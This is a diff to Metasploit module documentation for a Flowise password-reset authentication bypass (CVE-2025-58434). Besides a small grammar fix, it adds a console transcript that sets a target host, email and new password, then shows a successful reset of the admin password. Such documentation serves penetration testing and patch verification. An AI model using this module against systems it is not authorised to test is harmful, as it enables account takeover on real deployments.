@@ -52,7 +52,7 @@ mailhog/mailhog
 
 ### EMAIL (required)
 
-Email address of the Flowise user who's password is to be reset
+Email address of the Flowise user whose password is to be reset
 
 ### NEWPASSWORD (required)
 
@@ -61,3 +61,19 @@ NOTE: Flowise does not accept empty strings as passwords.
 
 
 ## Scenarios
+```
+msf > use auxiliary/gather/flowise_auth_bypass_cve_2025_58434
+msf auxiliary(gather/flowise_auth_bypass_cve_2025_58434) > set RHOSTS 192.168.1.30
+RHOSTS => 192.168.1.30
+msf auxiliary(gather/flowise_auth_bypass_cve_2025_58434) > set EMAIL admin@local.com
+EMAIL => admin@local.com
+msf auxiliary(gather/flowise_auth_bypass_cve_2025_58434) > set NEWPASSWORD password123
+NEWPASSWORD => password123
+msf auxiliary(gather/flowise_auth_bypass_cve_2025_58434) > run
+[*] Running module against 192.168.1.30
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Flowise version 3.0.4 is in the vulnerable range
+[+] Password reset successful. Loot stored in: /home/richard/.msf4/loot/20260806210741_default_192.168.1.30_flowise.files_888141.txt
+[*] Auxiliary module execution completed
+msf auxiliary(gather/flowise_auth_bypass_cve_2025_58434) >
+```
